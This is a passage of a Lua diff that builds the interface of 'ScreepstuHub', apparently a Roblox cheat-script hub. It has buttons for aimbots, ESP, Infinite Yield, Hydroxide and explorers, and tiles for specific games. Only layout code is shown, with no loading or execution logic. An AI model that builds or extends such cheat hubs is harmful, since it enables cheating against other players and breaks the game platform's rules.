+ScreepstuHub.RestoreUp.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.RestoreUp.AnchorPoint = Vector2.new(1, 1)
+ScreepstuHub.RestoreUp.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.RestoreUp.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.RestoreUp.BorderSizePixel = 0
+ScreepstuHub.RestoreUp.Draggable = true
+ScreepstuHub.RestoreUp.Position = UDim2.new(1, -16, 1, -32)
+ScreepstuHub.RestoreUp.Size = UDim2.new(0, 32, 0, 32)
+ScreepstuHub.RestoreUp.Visible = false
+ScreepstuHub.RestoreUp.Image = "rbxassetid://4838075912"
+
+ScreepstuHub.UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke.Thickness = 2
+ScreepstuHub.UIStroke.Parent = ScreepstuHub.RestoreUp
+
+ScreepstuHub.DropShadowHolder.Name = "DropShadowHolder"
+ScreepstuHub.DropShadowHolder.Parent = ScreepstuHub.RestoreUp
+ScreepstuHub.DropShadowHolder.BackgroundTransparency = 1.000
+ScreepstuHub.DropShadowHolder.BorderSizePixel = 0
+ScreepstuHub.DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.DropShadowHolder.ZIndex = 0
+
+ScreepstuHub.DropShadow.Name = "DropShadow"
+ScreepstuHub.DropShadow.Parent = ScreepstuHub.DropShadowHolder
+ScreepstuHub.DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+ScreepstuHub.DropShadow.BackgroundTransparency = 1.000
+ScreepstuHub.DropShadow.BorderSizePixel = 0
+ScreepstuHub.DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+ScreepstuHub.DropShadow.Size = UDim2.new(1, 47, 1, 47)
+ScreepstuHub.DropShadow.ZIndex = 0
+ScreepstuHub.DropShadow.Image = "rbxassetid://6015897843"
+ScreepstuHub.DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.DropShadow.ImageTransparency = 0.500
+ScreepstuHub.DropShadow.ScaleType = Enum.ScaleType.Slice
+ScreepstuHub.DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
+
+ScreepstuHub.Container2.Name = "Container2"
+ScreepstuHub.Container2.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Container2.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Container2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Container2.BorderSizePixel = 0
+ScreepstuHub.Container2.Position = UDim2.new(0, 100, 0, 30)
+ScreepstuHub.Container2.Size = UDim2.new(1, -100, 1, -30)
+ScreepstuHub.Container2.Visible = false
+ScreepstuHub.Container2.ZIndex = 0
+
+ScreepstuHub.UIGridLayout.Parent = ScreepstuHub.Container2
+ScreepstuHub.UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ScreepstuHub.UIGridLayout.CellSize = UDim2.new(0, 100, 0, 75)
+
+ScreepstuHub.UIPadding_2.Parent = ScreepstuHub.Container2
+ScreepstuHub.UIPadding_2.PaddingLeft = UDim.new(0, 16)
+ScreepstuHub.UIPadding_2.PaddingTop = UDim.new(0, 16)
+
+ScreepstuHub.AimbotV3.Name = "AimbotV3"
+ScreepstuHub.AimbotV3.Parent = ScreepstuHub.Container2
+ScreepstuHub.AimbotV3.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.AimbotV3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.AimbotV3.BorderSizePixel = 0
+ScreepstuHub.AimbotV3.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.AimbotV3.ZIndex = 2
+ScreepstuHub.AimbotV3.Font = Enum.Font.Arial
+ScreepstuHub.AimbotV3.Text = "AimbotV3"
+ScreepstuHub.AimbotV3.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.AimbotV3.TextScaled = true
+ScreepstuHub.AimbotV3.TextSize = 14.000
+ScreepstuHub.AimbotV3.TextWrapped = true
+
+ScreepstuHub.UIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_2.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_2.Parent = ScreepstuHub.AimbotV3
+
+ScreepstuHub.UITextSizeConstraint_10.Parent = ScreepstuHub.AimbotV3
+ScreepstuHub.UITextSizeConstraint_10.MaxTextSize = 14
+
+ScreepstuHub.AntiLag.Name = "AntiLag"
+ScreepstuHub.AntiLag.Parent = ScreepstuHub.Container2
+ScreepstuHub.AntiLag.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.AntiLag.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.AntiLag.BorderSizePixel = 0
+ScreepstuHub.AntiLag.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.AntiLag.ZIndex = 2
+ScreepstuHub.AntiLag.Font = Enum.Font.Arial
+ScreepstuHub.AntiLag.Text = "Anti-Lag"
+ScreepstuHub.AntiLag.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.AntiLag.TextScaled = true
+ScreepstuHub.AntiLag.TextSize = 14.000
+ScreepstuHub.AntiLag.TextWrapped = true
+
+ScreepstuHub.UIStroke_3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_3.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_3.Parent = ScreepstuHub.AntiLag
+
+ScreepstuHub.UITextSizeConstraint_11.Parent = ScreepstuHub.AntiLag
+ScreepstuHub.UITextSizeConstraint_11.MaxTextSize = 14
+
+ScreepstuHub.BetterRoblox.Name = "BetterRoblox"
+ScreepstuHub.BetterRoblox.Parent = ScreepstuHub.Container2
+ScreepstuHub.BetterRoblox.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.BetterRoblox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.BetterRoblox.BorderSizePixel = 0
+ScreepstuHub.BetterRoblox.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.BetterRoblox.ZIndex = 2
+ScreepstuHub.BetterRoblox.Font = Enum.Font.Arial
+ScreepstuHub.BetterRoblox.Text = "Better Roblox"
+ScreepstuHub.BetterRoblox.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.BetterRoblox.TextScaled = true
+ScreepstuHub.BetterRoblox.TextSize = 14.000
+ScreepstuHub.BetterRoblox.TextWrapped = true
+
+ScreepstuHub.UIStroke_4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_4.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_4.Parent = ScreepstuHub.BetterRoblox
+
+ScreepstuHub.UITextSizeConstraint_12.Parent = ScreepstuHub.BetterRoblox
+ScreepstuHub.UITextSizeConstraint_12.MaxTextSize = 14
+
+ScreepstuHub.CMDX.Name = "CMDX"
+ScreepstuHub.CMDX.Parent = ScreepstuHub.Container2
+ScreepstuHub.CMDX.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.CMDX.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.CMDX.BorderSizePixel = 0
+ScreepstuHub.CMDX.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.CMDX.ZIndex = 2
+ScreepstuHub.CMDX.Font = Enum.Font.Arial
+ScreepstuHub.CMDX.Text = "CMDX"
+ScreepstuHub.CMDX.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.CMDX.TextScaled = true
+ScreepstuHub.CMDX.TextSize = 14.000
+ScreepstuHub.CMDX.TextWrapped = true
+
+ScreepstuHub.UIStroke_5.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_5.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_5.Parent = ScreepstuHub.CMDX
+
+ScreepstuHub.UITextSizeConstraint_13.Parent = ScreepstuHub.CMDX
+ScreepstuHub.UITextSizeConstraint_13.MaxTextSize = 14
+
+ScreepstuHub.DExplorer.Name = "DExplorer"
+ScreepstuHub.DExplorer.Parent = ScreepstuHub.Container2
+ScreepstuHub.DExplorer.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.DExplorer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.DExplorer.BorderSizePixel = 0
+ScreepstuHub.DExplorer.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.DExplorer.ZIndex = 2
+ScreepstuHub.DExplorer.Font = Enum.Font.Arial
+ScreepstuHub.DExplorer.Text = "DExplorer"
+ScreepstuHub.DExplorer.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.DExplorer.TextScaled = true
+ScreepstuHub.DExplorer.TextSize = 14.000
+ScreepstuHub.DExplorer.TextWrapped = true
+
+ScreepstuHub.UIStroke_6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_6.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_6.Parent = ScreepstuHub.DExplorer
+
+ScreepstuHub.UITextSizeConstraint_14.Parent = ScreepstuHub.DExplorer
+ScreepstuHub.UITextSizeConstraint_14.MaxTextSize = 14
+
+ScreepstuHub.DomainX.Name = "DomainX"
+ScreepstuHub.DomainX.Parent = ScreepstuHub.Container2
+ScreepstuHub.DomainX.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.DomainX.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.DomainX.BorderSizePixel = 0
+ScreepstuHub.DomainX.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.DomainX.ZIndex = 2
+ScreepstuHub.DomainX.Font = Enum.Font.Arial
+ScreepstuHub.DomainX.Text = "DomainX"
+ScreepstuHub.DomainX.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.DomainX.TextScaled = true
+ScreepstuHub.DomainX.TextSize = 14.000
+ScreepstuHub.DomainX.TextWrapped = true
+
+ScreepstuHub.UIStroke_7.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_7.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_7.Parent = ScreepstuHub.DomainX
+
+ScreepstuHub.UITextSizeConstraint_15.Parent = ScreepstuHub.DomainX
+ScreepstuHub.UITextSizeConstraint_15.MaxTextSize = 14
+
+ScreepstuHub.Hydroxide.Name = "Hydroxide"
+ScreepstuHub.Hydroxide.Parent = ScreepstuHub.Container2
+ScreepstuHub.Hydroxide.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.Hydroxide.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Hydroxide.BorderSizePixel = 0
+ScreepstuHub.Hydroxide.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.Hydroxide.ZIndex = 2
+ScreepstuHub.Hydroxide.Font = Enum.Font.Arial
+ScreepstuHub.Hydroxide.Text = "Hydroxide"
+ScreepstuHub.Hydroxide.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.Hydroxide.TextScaled = true
+ScreepstuHub.Hydroxide.TextSize = 14.000
+ScreepstuHub.Hydroxide.TextWrapped = true
+
+ScreepstuHub.UIStroke_8.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_8.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_8.Parent = ScreepstuHub.Hydroxide
+
+ScreepstuHub.UITextSizeConstraint_16.Parent = ScreepstuHub.Hydroxide
+ScreepstuHub.UITextSizeConstraint_16.MaxTextSize = 14
+
+ScreepstuHub.InfiniteYield.Name = "InfiniteYield"
+ScreepstuHub.InfiniteYield.Parent = ScreepstuHub.Container2
+ScreepstuHub.InfiniteYield.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.InfiniteYield.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.InfiniteYield.BorderSizePixel = 0
+ScreepstuHub.InfiniteYield.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.InfiniteYield.ZIndex = 2
+ScreepstuHub.InfiniteYield.Font = Enum.Font.Arial
+ScreepstuHub.InfiniteYield.Text = "Infinite Yield"
+ScreepstuHub.InfiniteYield.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.InfiniteYield.TextScaled = true
+ScreepstuHub.InfiniteYield.TextSize = 14.000
+ScreepstuHub.InfiniteYield.TextWrapped = true
+
+ScreepstuHub.UIStroke_9.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_9.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_9.Parent = ScreepstuHub.InfiniteYield
+
+ScreepstuHub.UITextSizeConstraint_17.Parent = ScreepstuHub.InfiniteYield
+ScreepstuHub.UITextSizeConstraint_17.MaxTextSize = 14
+
+ScreepstuHub.NexusWeaponry.Name = "NexusWeaponry"
+ScreepstuHub.NexusWeaponry.Parent = ScreepstuHub.Container2
+ScreepstuHub.NexusWeaponry.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.NexusWeaponry.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.NexusWeaponry.BorderSizePixel = 0
+ScreepstuHub.NexusWeaponry.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.NexusWeaponry.ZIndex = 2
+ScreepstuHub.NexusWeaponry.Font = Enum.Font.Arial
+ScreepstuHub.NexusWeaponry.Text = "Nexus Weaponry"
+ScreepstuHub.NexusWeaponry.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.NexusWeaponry.TextScaled = true
+ScreepstuHub.NexusWeaponry.TextSize = 14.000
+ScreepstuHub.NexusWeaponry.TextWrapped = true
+
+ScreepstuHub.UIStroke_10.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_10.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_10.Parent = ScreepstuHub.NexusWeaponry
+
+ScreepstuHub.UITextSizeConstraint_18.Parent = ScreepstuHub.NexusWeaponry
+ScreepstuHub.UITextSizeConstraint_18.MaxTextSize = 14
+
+ScreepstuHub.SecureDex.Name = "SecureDex"
+ScreepstuHub.SecureDex.Parent = ScreepstuHub.Container2
+ScreepstuHub.SecureDex.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.SecureDex.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.SecureDex.BorderSizePixel = 0
+ScreepstuHub.SecureDex.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.SecureDex.ZIndex = 2
+ScreepstuHub.SecureDex.Font = Enum.Font.Arial
+ScreepstuHub.SecureDex.Text = "Secure DExplorer"
+ScreepstuHub.SecureDex.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.SecureDex.TextScaled = true
+ScreepstuHub.SecureDex.TextSize = 14.000
+ScreepstuHub.SecureDex.TextWrapped = true
+
+ScreepstuHub.UIStroke_11.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_11.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_11.Parent = ScreepstuHub.SecureDex
+
+ScreepstuHub.UITextSizeConstraint_19.Parent = ScreepstuHub.SecureDex
+ScreepstuHub.UITextSizeConstraint_19.MaxTextSize = 14
+
+ScreepstuHub.UnnamedESP.Name = "UnnamedESP"
+ScreepstuHub.UnnamedESP.Parent = ScreepstuHub.Container2
+ScreepstuHub.UnnamedESP.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.UnnamedESP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.UnnamedESP.BorderSizePixel = 0
+ScreepstuHub.UnnamedESP.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.UnnamedESP.ZIndex = 2
+ScreepstuHub.UnnamedESP.Font = Enum.Font.Arial
+ScreepstuHub.UnnamedESP.Text = "Unnamed ESP"
+ScreepstuHub.UnnamedESP.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UnnamedESP.TextScaled = true
+ScreepstuHub.UnnamedESP.TextSize = 14.000
+ScreepstuHub.UnnamedESP.TextWrapped = true
+
+ScreepstuHub.UIStroke_12.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_12.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_12.Parent = ScreepstuHub.UnnamedESP
+
+ScreepstuHub.UITextSizeConstraint_20.Parent = ScreepstuHub.UnnamedESP
+ScreepstuHub.UITextSizeConstraint_20.MaxTextSize = 14
+
+ScreepstuHub.WRDAimbot.Name = "WRDAimbot"
+ScreepstuHub.WRDAimbot.Parent = ScreepstuHub.Container2
+ScreepstuHub.WRDAimbot.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.WRDAimbot.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.WRDAimbot.BorderSizePixel = 0
+ScreepstuHub.WRDAimbot.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.WRDAimbot.ZIndex = 2
+ScreepstuHub.WRDAimbot.Font = Enum.Font.Arial
+ScreepstuHub.WRDAimbot.Text = "WeAreDevs' Aimbot"
+ScreepstuHub.WRDAimbot.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.WRDAimbot.TextScaled = true
+ScreepstuHub.WRDAimbot.TextSize = 14.000
+ScreepstuHub.WRDAimbot.TextWrapped = true
+
+ScreepstuHub.UIStroke_13.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_13.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_13.Parent = ScreepstuHub.WRDAimbot
+
+ScreepstuHub.UITextSizeConstraint_21.Parent = ScreepstuHub.WRDAimbot
+ScreepstuHub.UITextSizeConstraint_21.MaxTextSize = 14
+
+ScreepstuHub.WRDESP.Name = "WRDESP"
+ScreepstuHub.WRDESP.Parent = ScreepstuHub.Container2
+ScreepstuHub.WRDESP.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.WRDESP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.WRDESP.BorderSizePixel = 0
+ScreepstuHub.WRDESP.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.WRDESP.ZIndex = 2
+ScreepstuHub.WRDESP.Font = Enum.Font.Arial
+ScreepstuHub.WRDESP.Text = "WeAreDevs' ESP"
+ScreepstuHub.WRDESP.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.WRDESP.TextScaled = true
+ScreepstuHub.WRDESP.TextSize = 14.000
+ScreepstuHub.WRDESP.TextWrapped = true
+
+ScreepstuHub.UIStroke_14.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_14.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_14.Parent = ScreepstuHub.WRDESP
+
+ScreepstuHub.UITextSizeConstraint_22.Parent = ScreepstuHub.WRDESP
+ScreepstuHub.UITextSizeConstraint_22.MaxTextSize = 14
+
+ScreepstuHub.Container3.Name = "Container3"
+ScreepstuHub.Container3.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Container3.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Container3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Container3.BorderSizePixel = 0
+ScreepstuHub.Container3.Position = UDim2.new(0, 100, 0, 30)
+ScreepstuHub.Container3.Size = UDim2.new(1, -100, 1, -30)
+ScreepstuHub.Container3.Visible = false
+
+ScreepstuHub.UIGridLayout_2.Parent = ScreepstuHub.Container3
+ScreepstuHub.UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
+ScreepstuHub.UIGridLayout_2.CellSize = UDim2.new(0, 100, 0, 75)
+
+ScreepstuHub.UIPadding_3.Parent = ScreepstuHub.Container3
+ScreepstuHub.UIPadding_3.PaddingLeft = UDim.new(0, 16)
+ScreepstuHub.UIPadding_3.PaddingTop = UDim.new(0, 16)
+
+ScreepstuHub.Arsenal.Name = "Arsenal"
+ScreepstuHub.Arsenal.Parent = ScreepstuHub.Container3
+ScreepstuHub.Arsenal.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.Arsenal.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Arsenal.BorderSizePixel = 0
+ScreepstuHub.Arsenal.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.Arsenal.ZIndex = 2
+ScreepstuHub.Arsenal.Font = Enum.Font.SourceSans
+ScreepstuHub.Arsenal.Text = ""
+ScreepstuHub.Arsenal.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Arsenal.TextSize = 14.000
+
+ScreepstuHub.ImageLabel.Parent = ScreepstuHub.Arsenal
+ScreepstuHub.ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel.BorderSizePixel = 0
+ScreepstuHub.ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel.ZIndex = 3
+ScreepstuHub.ImageLabel.Image = "rbxassetid://5419205806"
+
+ScreepstuHub.TextLabel.Parent = ScreepstuHub.ImageLabel
+ScreepstuHub.TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel.BorderSizePixel = 0
+ScreepstuHub.TextLabel.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel.ZIndex = 4
+ScreepstuHub.TextLabel.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel.Text = "Arsenal"
+ScreepstuHub.TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel.TextScaled = true
+ScreepstuHub.TextLabel.TextSize = 14.000
+ScreepstuHub.TextLabel.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_23.Parent = ScreepstuHub.TextLabel
+ScreepstuHub.UITextSizeConstraint_23.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_15.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_15.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_15.Thickness = 2
+ScreepstuHub.UIStroke_15.Parent = ScreepstuHub.Arsenal
+
+ScreepstuHub.BananaEats.Name = "BananaEats"
+ScreepstuHub.BananaEats.Parent = ScreepstuHub.Container3
+ScreepstuHub.BananaEats.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.BananaEats.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.BananaEats.BorderSizePixel = 0
+ScreepstuHub.BananaEats.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.BananaEats.ZIndex = 2
+ScreepstuHub.BananaEats.Font = Enum.Font.SourceSans
+ScreepstuHub.BananaEats.Text = ""
+ScreepstuHub.BananaEats.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.BananaEats.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_2.Parent = ScreepstuHub.BananaEats
+ScreepstuHub.ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_2.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_2.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_2.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_2.ZIndex = 3
+ScreepstuHub.ImageLabel_2.Image = "rbxassetid://17774730801"
+
+ScreepstuHub.TextLabel_2.Parent = ScreepstuHub.ImageLabel_2
+ScreepstuHub.TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_2.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_2.BorderSizePixel = 0
+ScreepstuHub.TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_2.ZIndex = 4
+ScreepstuHub.TextLabel_2.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_2.Text = "Banana Eats"
+ScreepstuHub.TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_2.TextScaled = true
+ScreepstuHub.TextLabel_2.TextSize = 14.000
+ScreepstuHub.TextLabel_2.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_2.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_24.Parent = ScreepstuHub.TextLabel_2
+ScreepstuHub.UITextSizeConstraint_24.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_16.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_16.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_16.Thickness = 2
+ScreepstuHub.UIStroke_16.Parent = ScreepstuHub.BananaEats
+
+ScreepstuHub.BrookhavenRP.Name = "BrookhavenRP"
+ScreepstuHub.BrookhavenRP.Parent = ScreepstuHub.Container3
+ScreepstuHub.BrookhavenRP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.BrookhavenRP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.BrookhavenRP.BorderSizePixel = 0
+ScreepstuHub.BrookhavenRP.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.BrookhavenRP.ZIndex = 2
+ScreepstuHub.BrookhavenRP.Font = Enum.Font.SourceSans
+ScreepstuHub.BrookhavenRP.Text = ""
+ScreepstuHub.BrookhavenRP.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.BrookhavenRP.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_3.Parent = ScreepstuHub.BrookhavenRP
+ScreepstuHub.ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_3.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_3.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_3.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_3.ZIndex = 3
+ScreepstuHub.ImageLabel_3.Image = "rbxassetid://17774745481"
+
+ScreepstuHub.TextLabel_3.Parent = ScreepstuHub.ImageLabel_3
+ScreepstuHub.TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_3.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_3.BorderSizePixel = 0
+ScreepstuHub.TextLabel_3.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_3.ZIndex = 4
+ScreepstuHub.TextLabel_3.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_3.Text = "Brookhaven RP"
+ScreepstuHub.TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_3.TextScaled = true
+ScreepstuHub.TextLabel_3.TextSize = 14.000
+ScreepstuHub.TextLabel_3.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_3.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_25.Parent = ScreepstuHub.TextLabel_3
+ScreepstuHub.UITextSizeConstraint_25.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_17.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_17.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_17.Thickness = 2
+ScreepstuHub.UIStroke_17.Parent = ScreepstuHub.BrookhavenRP
+
+ScreepstuHub.ClownKilling.Name = "ClownKilling"
+ScreepstuHub.ClownKilling.Parent = ScreepstuHub.Container3
+ScreepstuHub.ClownKilling.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ClownKilling.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ClownKilling.BorderSizePixel = 0
+ScreepstuHub.ClownKilling.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.ClownKilling.ZIndex = 2
+ScreepstuHub.ClownKilling.Font = Enum.Font.SourceSans
+ScreepstuHub.ClownKilling.Text = ""
+ScreepstuHub.ClownKilling.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ClownKilling.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_4.Parent = ScreepstuHub.ClownKilling
